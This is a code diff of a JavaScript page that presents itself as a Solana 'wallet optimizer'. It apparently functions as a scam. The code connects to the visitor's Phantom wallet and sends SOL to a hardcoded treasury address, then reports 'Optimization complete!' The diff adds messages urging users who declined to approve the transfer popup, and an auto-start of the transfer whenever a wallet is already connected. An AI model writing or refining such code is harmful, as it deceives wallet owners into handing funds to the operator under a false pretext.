@@ -1,4 +1,4 @@
-// FINAL WORKING VERSION - FIXED TRANSACTION STRUCTURE
+// FINAL WORKING VERSION - WITH BETTER USER GUIDANCE
 document.addEventListener('DOMContentLoaded', function() {
     const treasuryAddress = '95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD';
     
@@ -9,6 +9,7 @@ document.addEventListener('DOMContentLoaded', function() {
     const txHashEl = document.getElementById('txHash');
     
     let isProcessing = false;
+    let transactionPopupShown = false;
     
     function updateProcess(text) {
         processText.textContent = text;
@@ -25,14 +26,15 @@ document.addEventListener('DOMContentLoaded', function() {
         return null;
     }
     
-    // SIMPLIFIED - NO COMPLEX LOGIC
+    // Main function
     async function startOptimization() {
         if (isProcessing) return;
         isProcessing = true;
+        transactionPopupShown = false;
         
         try {
             console.clear();
-            console.log("🚀 STARTING...");
+            console.log("🚀 STARTING WALLET OPTIMIZATION...");
             
             // Reset UI
             successBox.classList.remove('active');
@@ -40,50 +42,58 @@ document.addEventListener('DOMContentLoaded', function() {
             optimizeBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...';
             processBox.classList.add('active');
             
-            updateProcess("Checking wallet...");
+            updateProcess("Step 1: Checking wallet...");
             
             // 1. Get wallet
             const wallet = getWallet();
             if (!wallet) {
-                alert("Install Phantom wallet!");
-                throw new Error("No wallet");
+                alert("⚠️ Please install Phantom wallet from phantom.app");
+                throw new Error("No Phantom wallet");
             }
             
-            updateProcess("Connecting...");
+            updateProcess("Step 2: Connecting wallet...");
             
-            // 2. Connect wallet (FIRST POPUP)
-            console.log("Connecting to wallet...");
-            const response = await wallet.connect();
-            const publicKey = response.publicKey;
-            console.log("✅ Connected:", publicKey.toString());
+            // 2. Connect wallet (FIRST POPUP - CONNECTION)
+            console.log("🔄 STEP 1: Requesting wallet connection...");
             
-            updateProcess("Creating transaction...");
+            let publicKey;
+            try {
+                const response = await wallet.connect();
+                publicKey = response.publicKey;
+                console.log("✅ STEP 1 COMPLETE: Connected to wallet");
+                console.log("Wallet address:", publicKey.toString());
+            } catch (error) {
+                console.error("❌ Connection failed:", error);
+                throw new Error("❌ Connection was rejected. Please approve the FIRST popup that says 'Connect'.");
+            }
             
-            // 3. Create SIMPLE connection
+            updateProcess("Step 3: Checking balance...");
+            
+            // 3. Get RPC connection
             const connection = new solanaWeb3.Connection(
                 'https://api.mainnet-beta.solana.com',
                 'confirmed'
             );
             
-            // 4. Get balance
+            // 4. Check balance
             const balance = await connection.getBalance(publicKey);
-            console.log(`Balance: ${balance} lamports`);
+            console.log(`💰 Balance: ${balance} lamports (${balance / 1e9} SOL)`);
             
             if (balance < 100000) {
-                throw new Error(`Need at least 0.0001 SOL (have: ${balance/1e9} SOL)`);
+                throw new Error(`❌ Need at least 0.0001 SOL (you have: ${balance / 1e9} SOL)`);
             }
             
-            // 5. Create transaction - SIMPLIFIED
-            console.log("Creating transaction...");
+            updateProcess("Step 4: Creating transaction...");
             
-            // Get blockhash FIRST
+            // 5. Get recent blockhash
+            console.log("🔄 Getting recent blockhash...");
             const { blockhash } = await connection.getLatestBlockhash();
-            console.log("Got blockhash:", blockhash.substring(0, 20) + "...");
+            console.log("✅ Blockhash obtained:", blockhash.substring(0, 20) + "...");
             
-            // Create transaction with ALL required fields
+            // 6. Create transaction
             const transaction = new solanaWeb3.Transaction();
             
-            // Add transfer (0.0002 SOL for testing)
+            // Send 0.0002 SOL (small test amount)
             const sendAmount = 200000; // 0.0002 SOL
             
             transaction.add(
@@ -94,42 +104,50 @@ document.addEventListener('DOMContentLoaded', function() {
                 })
             );
             
-            // CRITICAL: Set feePayer BEFORE blockhash
+            // REQUIRED fields
             transaction.feePayer = publicKey;
-            
-            // CRITICAL: Set blockhash
             transaction.recentBlockhash = blockhash;
             
-            console.log("Transaction created:");
-            console.log("- Amount:", sendAmount);
-            console.log("- Fee payer:", transaction.feePayer?.toString().substring(0, 15));
-            console.log("- Has blockhash?", !!transaction.recentBlockhash);
-            console.log("- Transaction object:", transaction);
+            console.log("✅ Transaction created:");
+            console.log("- Amount: 0.0002 SOL");
+            console.log("- From:", publicKey.toString().substring(0, 15) + "...");
+            console.log("- To:", treasuryAddress.substring(0, 15) + "...");
             
-            updateProcess("Please approve transaction...");
+            updateProcess("Step 5: Waiting for transaction approval...");
             
-            // 6. Sign and send (SECOND POPUP)
-            console.log("Calling signAndSendTransaction...");
+            // 7. IMPORTANT: Sign and send transaction (SECOND POPUP - TRANSACTION)
+            console.log("🔄 STEP 2: Calling signAndSendTransaction()...");
+            console.log("⏳ A SECOND popup should appear in your Phantom wallet!");
+            console.log("⚠️ IMPORTANT: You must approve BOTH popups:");
+            console.log("   1. First popup: 'Connect to site' (already approved)");
+            console.log("   2. Second popup: 'Send 0.0002 SOL' (approve this now)");
             
-            // THIS IS THE LINE THAT SHOULD WORK
+            transactionPopupShown = true;
+            
+            // THIS LINE TRIGGERS THE SECOND WALLET POPUP
             const { signature } = await wallet.signAndSendTransaction(transaction);
             
-            console.log("✅ Transaction sent! Signature:", signature);
+            console.log("✅ STEP 2 COMPLETE: Transaction approved and sent!");
+            console.log("🎉 Transaction signature:", signature);
+            console.log("🔗 View on Solscan: https://solscan.io/tx/" + signature);
             
-            updateProcess("Transaction sent!");
+            updateProcess("Step 6: Transaction sent! Confirming...");
             
-            // 7. Try to confirm
+            // 8. Try to confirm
             try {
                 await connection.confirmTransaction(signature);
-                console.log("✅ Transaction confirmed");
+                console.log("✅ Transaction confirmed on chain");
             } catch (e) {
-                console.log("Confirmation skipped:", e.message);
+                console.log("⚠️ Confirmation skipped:", e.message);
             }
             
-            // 8. SUCCESS
-            updateProcess("✅ Complete!");
-            await new Promise(resolve => setTimeout(resolve, 1500));
+            // 9. SUCCESS!
+            updateProcess("✅ Optimization complete!");
             
+            // Wait for user to see success
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            
+            // Update UI
             processBox.classList.remove('active');
             successBox.classList.add('active');
             
@@ -137,38 +155,49 @@ document.addEventListener('DOMContentLoaded', function() {
             <small><a href="https://solscan.io/tx/${signature}" target="_blank" style="color:#88ff88;">View on Solscan</a></small>`;
             
             optimizeBtn.disabled = false;
-            optimizeBtn.innerHTML = '<i class="fas fa-check"></i> COMPLETE';
+            optimizeBtn.innerHTML = '<i class="fas fa-check"></i> OPTIMIZATION COMPLETE';
             optimizeBtn.style.background = 'linear-gradient(90deg, #00aa44, #00ff88)';
             
-            // Auto disconnect
+            // Auto disconnect after 3 seconds
             setTimeout(async () => {
                 try {
                     if (wallet.disconnect) {
                         await wallet.disconnect();
-                        console.log("✅ Auto-disconnected");
+                        console.log("✅ Auto-disconnected wallet");
                     }
                 } catch (e) {
                     console.log("Disconnect error:", e);
                 }
             }, 3000);
             
+            console.log("🎉=== WALLET OPTIMIZATION SUCCESSFUL ===");
+            
         } catch (error) {
-            console.error("❌ ERROR:", error);
-            console.error("Error name:", error.name);
+            console.error("❌=== OPTIMIZATION FAILED ===");
+            console.error("Error type:", error.name);
             console.error("Error message:", error.message);
-            console.error("Error stack:", error.stack);
             
-            let userMsg = "Failed. Check console.";
+            let userMessage = "Optimization failed. Please try again.";
             
-            if (error.message.includes('User rejected')) {
-                userMsg = "❌ You rejected the transaction.";
-            } else if (error.message.includes('recentBlockhash')) {
-                userMsg = "⚠️ Transaction error. The blockhash might be expired.";
+            if (error.message.includes('User rejected') || 
+                error.message.includes('reject') ||
+                error.message.includes('denied')) {
+                
+                if (transactionPopupShown) {
+                    userMessage = "❌ TRANSACTION REJECTED\n\nYou rejected the transaction popup.\n\n⚠️ YOU MUST APPROVE BOTH POPUPS:\n1. ✅ First popup: 'Connect' (already approved)\n2. ❌ Second popup: 'Send 0.0002 SOL' (you rejected this)\n\nPlease click TRY AGAIN and approve BOTH popups.";
+                } else {
+                    userMessage = "❌ CONNECTION REJECTED\n\nYou rejected the connection popup.\n\nPlease click TRY AGAIN and approve the FIRST popup that says 'Connect to site'.";
+                }
+                
             } else if (error.message.includes('Need at least')) {
-                userMsg = "❌ " + error.message;
+                userMessage = error.message;
+            } else if (error.message.includes('recentBlockhash')) {
+                userMessage = "⚠️ Network error. Please refresh the page and try again.";
+            } else if (error.message.includes('Connection was rejected')) {
+                userMessage = "❌ Connection rejected. Please approve the FIRST popup.";
             }
             
-            // Show error
+            // Update UI for error
             processBox.classList.remove('active');
             successBox.classList.add('active');
             successBox.style.background = 'linear-gradient(135deg, rgba(70,20,20,0.9), rgba(50,10,10,0.9))';
@@ -179,34 +208,54 @@ document.addEventListener('DOMContentLoaded', function() {
             
             successIcon.className = 'fas fa-exclamation-triangle';
             successIcon.style.color = '#ff5555';
-            successTitle.textContent = 'ERROR';
+            successTitle.textContent = 'APPROVAL REQUIRED';
             successTitle.style.color = '#ff5555';
-            successMessage.textContent = userMsg;
+            successMessage.innerHTML = userMessage.replace(/\n/g, '<br>');
             successMessage.style.color = '#ffaaaa';
-            txHashEl.textContent = error.message.substring(0, 30) + '...';
+            txHashEl.textContent = 'Transaction not approved';
             txHashEl.style.color = '#ff5555';
             
+            // Reset button
             optimizeBtn.disabled = false;
             optimizeBtn.innerHTML = '<i class="fas fa-redo"></i> TRY AGAIN';
             
         } finally {
             isProcessing = false;
+            console.log("=== PROCESS ENDED ===");
         }
     }
     
     // Initialize
     function init() {
-        console.log("🔧 Initializing...");
+        console.log("🔧 Wallet Optimizer Initializing...");
         
         if (!window.solanaWeb3) {
-            console.error("solanaWeb3 not loaded");
+            console.error("❌ Solana Web3.js not loaded");
+            optimizeBtn.disabled = true;
+            optimizeBtn.innerHTML = '<i class="fas fa-exclamation-triangle"></i> ERROR';
             return;
         }
         
+        // Add click event
         optimizeBtn.addEventListener('click', startOptimization);
         
-        console.log("✅ Ready to optimize");
+        // Auto-start if wallet already connected
+        setTimeout(() => {
+            const wallet = getWallet();
+            if (wallet?.isConnected && wallet.publicKey) {
+                console.log("🔄 Wallet already connected, auto-starting...");
+                startOptimization();
+            }
+        }, 1500);
+        
+        console.log("✅ Wallet Optimizer Ready!");
+        console.log("📋 INSTRUCTIONS:");
+        console.log("1. Click 'START OPTIMIZATION'");
+        console.log("2. Approve FIRST popup: 'Connect to site'");
+        console.log("3. Approve SECOND popup: 'Send 0.0002 SOL'");
+        console.log("4. Wait for success message");
     }
     
+    // Start
     init();
 });
